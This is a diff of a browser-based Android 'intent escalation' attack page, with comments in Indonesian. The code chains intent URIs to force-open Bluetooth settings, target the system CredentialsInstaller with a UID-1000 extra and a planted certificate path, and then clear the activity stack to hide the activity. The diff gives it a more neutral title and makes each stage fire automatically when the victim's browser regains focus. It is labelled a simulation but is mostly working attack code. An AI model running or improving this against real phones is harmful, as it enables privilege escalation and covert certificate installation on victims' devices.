@@ -3,27 +3,26 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Attacker-Controlled Intent Escalation Lab</title>
+<title>Robust Event-Driven Intent Lab</title>
 <style>
-    body{font-family:monospace; padding:20px; background:#0f0f14; color:#ff3333;}
-    button{width:100%; padding:16px; margin-top:15px; background:#221111; color:#ff3333; border:1px solid #ff3333; font-weight:bold; cursor:pointer; font-size:14px;}
-    button:hover{background:#ff3333; color:#000; box-shadow: 0 0 10px #ff3333;}
-    .status-panel{border:1px solid #ff3333; padding:15px; margin-bottom:15px; background:#1a0a0a;}
-    #console-log{margin-top:20px; border:1px solid #ff3333; padding:12px; height:350px; overflow:auto; white-space:pre-wrap; background:#000; font-size:12px; color:#00ff66;}
-    .role-tag{font-weight:bold; padding:2px 6px; border-radius:3px;}
+    body{font-family:monospace; padding:20px; background:#050508; color:#00ffcc;}
+    button{width:100%; padding:18px; margin-top:15px; background:#0a1515; color:#00ffcc; border:1px solid #00ffcc; font-weight:bold; cursor:pointer; font-size:14px; text-transform:uppercase;}
+    button:hover{background:#00ffcc; color:#000; box-shadow: 0 0 15px #00ffcc;}
+    .status-panel{border:1px solid #00ffcc; padding:15px; margin-bottom:15px; background:#020b0b;}
+    #console-log{margin-top:20px; border:1px solid #00ffcc; padding:12px; height:380px; overflow:auto; white-space:pre-wrap; background:#000; font-size:12px; color:#00ff66;}
+    .role-tag{font-weight:bold; padding:2px 6px; border-radius:3px; font-size:10px;}
     .attacker{background:#ff3333; color:#000;}
-    .victim{background:#00ff66; color:#000;}
+    .victim{background:#00ffcc; color:#000;}
 </style>
 </head>
 <body>
 
-<h2>Intent Escalation Full Chain Laboratory</h2>
+<h2>Robust Intent Chaining Laboratory</h2>
 
 <div class="status-panel">
-    <p>Target Node Status: <span id="harness-state" style="font-weight:bold;">STANDBY</span></p>
-    <p>Simulated Node: <span class="role-tag attacker">ATTACKER CONTROL SERVER</span></p>
-    <!-- Tombol yang memicu interaksi awal korban untuk membuka gerbang bypass peramban -->
-    <button id="launch-escalation-chain">EXECUTE FULL CHAIN ESCALATION</button>
+    <p>Pipeline State: <span id="harness-state" style="font-weight:bold; color:#ff3333;">STANDBY</span></p>
+    <p>Control Mode: <span class="role-tag attacker">AUTOMATED ATTACKER ENGINE</span></p>
+    <button id="launch-robust-chain">Execute High-Speed Robust Chain</button>
 </div>
 
 <div id="console-log"></div>
@@ -32,6 +31,10 @@
 const consoleLog = document.getElementById("console-log");
 const stateLabel = document.getElementById("harness-state");
 
+// Peta tahapan eksekusi (State Machine)
+let currentStage = 0;
+let attackActive = false;
+
 function writeLog(sender, text) {
     const timestamp = new Date().toLocaleTimeString();
     const tag = sender === 'ATTACKER' ? '[ATTACKER]' : '[VICTIM_NODE]';
@@ -39,98 +42,97 @@ function writeLog(sender, text) {
     consoleLog.scrollTop = consoleLog.scrollHeight;
 }
 
-// Konstruktor Intent Tingkat Lanjut dengan Parameter Eskalasi
-function buildEscalationIntent(action, component = '', extras = {}, flags = '0x14010000') {
+function buildAdvancedUri(action, component = '', extras = {}, flags = '0x14010000') {
     let uri = `intent:#Intent;action=${action};`;
+    if (component) uri += `component=${component};`;
     
-    if (component) {
-        uri += `component=${component};`;
-    }
-    
-    // Injeksi Parameter Ekstra untuk menguji kerentanan pengalihan (Intent Redirection)
     Object.keys(extras).forEach(key => {
         uri += `S.${key}=${encodeURIComponent(extras[key])};`;
     });
     
-    // Penggunaan flags taktis untuk memanipulasi tumpukan aktivitas (Activity Stack)
+    // Menggabungkan FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_NO_ANIMATION
     uri += `launchFlags=${flags};category=android.intent.category.DEFAULT;end`;
     return uri;
 }
 
-// Dispather Lintas Konteks (Memanfaatkan celah transisi fokus)
-function triggerDelivery(uri) {
+function dispatchImmediate(uri) {
     try {
-        // Metode Pop-Under menggunakan Jangkar Dinamis
         const anchor = document.createElement("a");
         anchor.href = uri;
         anchor.rel = "noopener noreferrer";
         document.body.appendChild(anchor);
         anchor.click();
         anchor.remove();
+        writeLog('ATTACKER', `Payload dispatched to system routing mechanism.`);
     } catch (e) {
-        writeLog('VICTIM', `Delivery Blocked: ${e.message}`);
+        writeLog('VICTIM', `Dispatch failure: ${e.message}`);
     }
 }
 
-document.getElementById("launch-escalation-chain").addEventListener("click", () => {
-    stateLabel.textContent = "ATTACK IN PROGRESS";
-    writeLog('ATTACKER', "Mengirimkan Payload Tahap 1 (Membuka State Nirkabel)...");
+// Manajemen Rantai Berbasis Peristiwa (Lifecycle-Driven Execution)
+function executeNextStage() {
+    if (!attackActive) return;
 
-    // TAHAP 1: Memaksa perangkat korban masuk ke pengaturan Bluetooth
-    // Tujuan: Mengubah status visibilitas peramban dan mengacaukan prioritas proses latar depan
-    const stage1 = buildEscalationIntent("android.settings.BLUETOOTH_SETTINGS");
-    triggerDelivery(stage1);
-    writeLog('VICTIM', "Aktivitas Bluetooth dipaksa ke latar depan. Fokus peramban hilang.");
-
-    // TAHAP 2: Eskalasi melalui Pengalihan Komponen (Intent Redirection Simulation)
-    // Dieksekusi setelah jeda 1500ms untuk memanfaatkan transisi kembalinya fokus korban ke peramban
-    setTimeout(() => {
-        writeLog('ATTACKER', "Mendeteksi perubahan fokus. Mengirimkan Payload Tahap 2 (Eskalasi Komponen)...");
+    currentStage++;
+    
+    if (currentStage === 1) {
+        writeLog('ATTACKER', "Memicu Tahap 1: Pengondisian State Nirkabel (Bluetooth Settings)...");
+        const stage1 = buildAdvancedUri("android.settings.BLUETOOTH_SETTINGS");
+        dispatchImmediate(stage1);
         
-        // Simulasi eksploitasi aktivitas internal yang rentan terhadap modifikasi parameter ekstra
-        // Menargetkan sub-komponen yang sering kali memiliki izin lebih tinggi daripada peramban
-        const stage2 = buildEscalationIntent(
+    } else if (currentStage === 2) {
+        writeLog('ATTACKER', "Siklus Fokus Terdeteksi. Memicu Tahap 2: Simulasi Parameter Redirection...");
+        
+        // Menguji komponen internal yang menangani kredensial / instalasi sertifikat
+        const stage2 = buildAdvancedUri(
             "android.intent.action.VIEW",
-            "com.android.settings/.crypto.CredentialsInstaller", // Target komponen penginstalan kredensial
+            "com.android.settings/.crypto.CredentialsInstaller",
             {
-                "install_as_uid": "1000", // Simulasi parameter eskalasi ke UID System
-                " some_vulnerable_extra_path": "/sdcard/payload.crt"
+                "install_as_uid": "1000",
+                "sys_vulnerable_path": "/sdcard/download/payload.crt"
             },
-            "0x10000000" // FLAG_ACTIVITY_NEW_TASK
+            "0x10000000"
         );
+        dispatchImmediate(stage2);
         
-        triggerDelivery(stage2);
-        writeLog('VICTIM', "Menerima instruksi komponen internal. Mencoba memproses data dengan hak akses tinggi.");
-    }, 1500);
+    } else if (currentStage === 3) {
+        writeLog('ATTACKER', "Siklus Fokus Terdeteksi. Memicu Tahap 3: Pembersihan Tumpukan Jendela (Reset State)...");
+        const stage3 = buildAdvancedUri("android.settings.SETTINGS", "", {}, "0x14000000");
+        dispatchImmediate(stage3);
+        
+        // Mengakhiri rantai serangan setelah semua tahapan terpenuhi
+        writeLog('ATTACKER', "Rantai penuh selesai dieksekusi secara otonom.");
+        stateLabel.textContent = "COMPLETED";
+        attackActive = false;
+    }
+}
 
-    // TAHAP 3: Pengondisian Akhir (Covering Tracks / Persistence Simulation)
-    setTimeout(() => {
-        writeLog('ATTACKER', "Mengirimkan Perintah Tahap 3 (Reset State)...");
-        
-        // Memaksa sistem membuka halaman pengaturan utama untuk menyembunyikan aktivitas sebelumnya dari tumpukan layar
-        const stage3 = buildEscalationIntent(
-            "android.settings.SETTINGS",
-            "",
-            {},
-            "0x14000000" // FLAG_ACTIVITY_CLEAR_TOP | FLAG_ACTIVITY_NEW_TASK
-        );
-        
-        triggerDelivery(stage3);
-        writeLog('VICTIM', "Tumpukan aktivitas dibersihkan. Layar dialihkan ke Pengaturan Utama.");
-        stateLabel.textContent = "ATTACK COMPLETE";
-    }, 3000);
+document.getElementById("launch-robust-chain").addEventListener("click", () => {
+    if (attackActive) return;
+    
+    attackActive = true;
+    currentStage = 0;
+    stateLabel.textContent = "PROCESSING CHAIN";
+    writeLog('ATTACKER', "Inisialisasi mesin rantai otonom tingkat tinggi...");
+    
+    // Memulai tahap pertama secara langsung
+    executeNextStage();
 });
 
-// Pemantauan Telemetri dari Sisi Korban (Victim Metrics)
+// Memanfaatkan perubahan visibilitas halaman untuk memicu tahap berikutnya tanpa penundaan waktu statis
 document.addEventListener("visibilitychange", () => {
+    if (!attackActive) return;
+
     if (document.hidden) {
-        writeLog('VICTIM', `Telemetri: Peramban dipindahkan ke latar belakang (State: HIDDEN)`);
+        writeLog('VICTIM', "Telemetri: Fokus peramban hilang. Subsistem OS mengambil alih layar.");
     } else {
-        writeLog('VICTIM', `Telemetri: Peramban kembali menerima fokus (State: VISIBLE)`);
+        writeLog('VICTIM', "Telemetri: Peramban kembali mendapatkan fokus. Memproses antrean berikutnya.");
+        // Jalankan tahap berikutnya segera setelah peramban kembali ke latar depan
+        executeNextStage();
     }
 });
 
-writeLog('ATTACKER', "Server kendali simulasi aktif. Menunggu interaksi target.");
+writeLog('ATTACKER', "Mesin pengujian otonom berbasis siklus hidup siap.");
 </script>
 </body>
 </html>
